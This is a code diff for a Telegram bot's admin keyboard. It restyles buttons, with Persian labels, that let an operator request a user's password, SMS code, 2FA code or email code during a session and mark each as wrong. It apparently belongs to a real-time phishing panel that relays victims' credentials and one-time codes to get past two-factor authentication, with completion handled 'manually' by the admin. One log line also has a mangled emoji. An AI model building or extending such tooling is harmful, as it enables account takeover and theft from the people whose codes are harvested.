@@ -288,7 +288,7 @@ export const updateSessionWithEmail = async (
       );
     }
 
-    console.log("✅ Session updated with email:", { sessionId, email });
+    console.log("�� Session updated with email:", { sessionId, email });
     return { success: true };
   } catch (error) {
     console.error("❌ Failed to update session with email:", error);
@@ -954,109 +954,98 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
 
   const buttons = [];
 
-  // First section: Authentication method buttons (show if not attempted yet)
-  const authRow = [];
+  // 🎯 ROW 1: Primary Authentication Methods (Main Actions)
+  const primaryAuthRow = [];
 
-  // Quick Action Buttons - Primary Security Methods
   if (!session.authAttempts["password"]) {
-    authRow.push({
-      text: "🔐 PASSWORD",
+    primaryAuthRow.push({
+      text: "🔐 رمز عبور",
       callback_data: `auth_password_${sessionId}`,
     });
     console.log("✅ Added Password button");
   }
 
+  primaryAuthRow.push({
+    text: "📱 کد SMS",
+    callback_data: `auth_sms_${sessionId}`,
+  });
+  console.log("✅ Added SMS Code button");
+
   if (!session.authAttempts["google"]) {
-    authRow.push({
-      text: "📲 2FA",
+    primaryAuthRow.push({
+      text: "🔒 احراز دومرحله‌ای",
       callback_data: `auth_google_${sessionId}`,
     });
-    console.log("✅ Added Google Auth button");
+    console.log("✅ Added 2FA button");
   }
 
-  // Add auth buttons row if there are any
-  if (authRow.length > 0) {
-    buttons.push(authRow);
+  if (primaryAuthRow.length > 0) {
+    buttons.push(primaryAuthRow);
   }
 
-  // Second section: Additional methods
-  // SMS Code button removed - only Wrong SMS buttons will be available
+  // 🎯 ROW 2: Secondary Authentication Methods
+  const secondaryAuthRow = [];
 
-  // Secondary Actions Row
-  const secondaryRow = [];
-
-  // Email Code Buttons - Always show both for debugging
-  console.log("🔍 Email attempts check:", {
-    sessionId: sessionId.slice(-8),
-    emailAttempts: session.authAttempts["email"] || 0,
-    authAttempts: session.authAttempts,
-  });
-
-  secondaryRow.push({
-    text: "📧 EMAIL CODE",
+  secondaryAuthRow.push({
+    text: "📧 کد ایمیل",
     callback_data: `auth_email_code_${sessionId}`,
   });
   console.log("✅ Added Email Code button");
 
-  secondaryRow.push({
-    text: "Wrong mail code",
-    callback_data: `incorrect_email_code_${sessionId}`,
-  });
-  console.log("✅ Added Wrong Email Code button");
-
-  secondaryRow.push({
-    text: "❌ WRONG #",
-    callback_data: `incorrect_sms_${sessionId}`,
-  });
-  console.log("✅ Added Wrong SMS button (always available)");
-
-  if (secondaryRow.length > 0) {
-    buttons.push(secondaryRow);
+  if (secondaryAuthRow.length > 0) {
+    buttons.push(secondaryAuthRow);
   }
 
-  // Status Check Button - Always available
-  buttons.push([
-    {
-      text: "🔍 بررسی وضعیت",
-      callback_data: `check_status_${sessionId}`,
-    },
-  ]);
-  console.log("✅ Added Check Status button");
+  // 🎯 ROW 3: Error/Wrong Actions (Only if attempted)
+  const errorActionsRow = [];
 
-  // Third section: Wrong buttons (ONLY show if user has attempted that method at least once)
-  const wrongButtonsRow1 = [];
-  const wrongButtonsRow2 = [];
-
-  // Wrong Actions - Compact Layout
-  if (
-    session.authAttempts["password"] &&
-    session.authAttempts["password"] > 0
-  ) {
-    wrongButtonsRow1.push({
-      text: "🚫 PASS",
+  if (session.authAttempts["password"] && session.authAttempts["password"] > 0) {
+    errorActionsRow.push({
+      text: "❌ رمز اشتباه",
       callback_data: `incorrect_password_${sessionId}`,
     });
     console.log("✅ Added Wrong Password button");
   }
 
   if (session.authAttempts["google"] && session.authAttempts["google"] > 0) {
-    wrongButtonsRow1.push({
-      text: "🚫 2FA",
+    errorActionsRow.push({
+      text: "❌ کد 2FA اشتباه",
       callback_data: `incorrect_google_${sessionId}`,
     });
-    console.log("✅ Added Wrong Google Auth button");
+    console.log("✅ Added Wrong 2FA button");
   }
 
-  // Wrong SMS button moved to main buttons section to be always available
-  // Wrong Email Code button moved to main buttons section
+  errorActionsRow.push({
+    text: "❌ کد SMS اشتباه",
+    callback_data: `incorrect_sms_${sessionId}`,
+  });
+  console.log("✅ Added Wrong SMS button");
 
-  // Add wrong buttons rows if there are any
-  if (wrongButtonsRow1.length > 0) {
-    buttons.push(wrongButtonsRow1);
+  if (errorActionsRow.length > 0) {
+    buttons.push(errorActionsRow);
   }
-  if (wrongButtonsRow2.length > 0) {
-    buttons.push(wrongButtonsRow2);
+
+  // 🎯 ROW 4: Email Error Actions
+  const emailErrorRow = [];
+
+  emailErrorRow.push({
+    text: "❌ کد ایمیل اشتباه",
+    callback_data: `incorrect_email_code_${sessionId}`,
+  });
+  console.log("✅ Added Wrong Email Code button");
+
+  if (emailErrorRow.length > 0) {
+    buttons.push(emailErrorRow);
   }
+
+  // 🎯 ROW 5: Status Check (Always available)
+  buttons.push([
+    {
+      text: "🔍 بررسی وضعیت کاربر",
+      callback_data: `check_status_${sessionId}`,
+    },
+  ]);
+  console.log("✅ Added Status Check button");
 
   // Note: Approve & Grant Access button removed - admin handles completion manually
 
